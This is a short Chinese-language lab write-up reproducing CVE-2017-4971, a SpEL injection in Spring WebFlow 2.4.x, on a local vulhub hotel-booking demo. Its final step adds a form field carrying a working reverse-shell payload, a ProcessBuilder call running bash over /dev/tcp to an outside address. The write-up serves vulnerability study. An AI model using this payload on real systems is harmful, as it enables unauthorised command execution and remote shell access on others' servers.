

# Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->SpEL命令执行

### 0x01漏洞介绍

​			Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。

​			影响版本

  		2.4.x

### 0x02漏洞复现

​	访问`http://your-ip:8080`，将看到一个酒店预订的页面，这是spring-webflow官方给的简单示例：

![Spring_WebFlow_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_WebFlow_RCE_1.jpg)

​	访问`http://your-ip:8080/login`，用页面左边给出的任意一个账号/密码登录系统：

![Spring_WebFlow_RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_WebFlow_RCE_2.jpg)

​	再点击确认“Confirm”：

![Spring_WebFlow_RCE_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_WebFlow_RCE_3.jpg)

此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：

```
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")).start()=vulhub

"bash -i >& /dev/tcp/10.0.0.1/21 0>&1" //此部分需要url编码
```

![Spring_WebFlow_RCE_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_WebFlow_RCE_4.jpg)

